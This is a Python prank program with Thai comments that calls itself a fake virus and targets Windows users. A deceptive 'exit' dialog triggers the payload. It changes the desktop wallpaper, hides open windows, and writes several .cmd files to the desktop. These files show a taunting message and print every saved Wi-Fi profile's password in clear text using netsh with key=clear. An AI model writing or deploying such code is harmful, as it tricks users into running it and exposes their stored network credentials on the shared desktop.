from ctypes import windll, wintypes
from tkinter import messagebox
from pyautogui import hotkey
import pygame
import ctypes
import time
import os

# import module file
from wifi_os import regular_wifi, looking_pws

# หา path desktop
path_desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'desktop')

# โค้ด command prompt
name_file = "My_Script" #ชื่อไฟล์ Virus ปลอมที่จะสร้าง
count_file = 5 # จำนวนไฟล์ Virus ที่จะสร้าง

wall_image = f'{os.getcwd()}\Kazuya.jpg' # wallpaper ที่จะเปลี่ยน

delay = 1
cmd_code = [
    "@echo off",
    "color a",
    "@echo  --------------------------------------------------------",
    "echo.  ",
    "echo                      She doesn't love you!",
    "echo.  ",
    "@echo  --------------------------------------------------------",
    "netsh wlan show profile",
    "pause"
]

def black_bg(count, long): # จอกระพริบ --> count = ครั้งของการกระพริบ, long = ความนานของจอสีดำ
    FPS = 60
    clock = pygame.time.Clock()

    for c in range(count):
        print(f"######### กระพิบรอบที่ {c} #########")
        pygame.init() # สร้างหน้าจอ

        bgClr = (0, 0, 0) # สีพื้นหลังตอนกระพริบ
        scr = pygame.display.set_mode((0, 0), pygame.FULLSCREEN) # เต็มจอ
        clock.tick(FPS)

        pygame.display.set_caption('You are a Kratugjit krasharkjai!') # แคบชั่น
        scr.fill(bgClr) # เติมพื้นหลังสีดำ
        pygame.display.flip() # อัพเดทหน้าจอ

        time.sleep(long)
        pygame.quit() # ปิดจอดำ


def make_file(cmd_code, name_file="Script", count_file=1, delay=delay): # สร้างไฟล์ .cmd
    for count in range(count_file):
        # สร้างไฟล์ .bat
        with open(os.path.join(path_desktop, f"{name_file}_{count+1}.cmd") , "w") as f:
            for line in cmd_code:
                f.write(line + "\n")

        print(f"สร้างไฟล์script_{count+1}.cmd")
        time.sleep(delay)

def change_wallpaper(wall_image):
    if os.path.exists(wall_image):
        print("Found file wallpaper")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_image, 0)
    else:
        print("Not found file wallpaper!!")


def main_virus(checked):
    # black_bg(3, 0.5) # กระพริบจอ
    time.sleep(1)
    change_wallpaper(wall_image=wall_image) # เปลี่ยน wallpaper
    hotkey("winleft", "d") # คีย์ลัด ซ่อนทุกโปรแกรมที่เปิดอยู่

    reg_name_wifi = regular_wifi() #หาชื่อไวไฟทั้งหมดที่เครื่องเคยเชื่อมต่อ

    # ดูรหัสไวไฟทุกตัวที่เคยเชื่อม
    for name in reg_name_wifi: # เพิ่มคำสั่งดูทุกรหัสไวไฟ ให้กับไฟล์ .cmd
        cmd_code.insert(-1, f"netsh wlan show profile {name} key=clear | findstr Name")
        cmd_code.insert(-1, f"netsh wlan show profile {name} key=clear | findstr Key")

    # สร้างไฟล์ .cmd
    make_file(cmd_code=cmd_code, name_file=name_file, count_file=count_file, delay=delay)
    
    # เปลี่ยนเป็น wallpaper default
    time.sleep(5)
    wall_default = r"C:\Windows\Web\Wallpaper\Windows\img19.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_default, 0)

    return 0;



if __name__ == '__main__':
    # เช็คว่าต้องการรันโปรแกรม (ตอนแปลงเป็น exe จะได้รู้ด้วยว่าไฟล์รัน)
    answer = messagebox.askokcancel("Confirmation", "Do you want to exit the program?")
    if answer:
        time.sleep(2)
        main_virus(True)
    else:
        exit("You exit with program!")
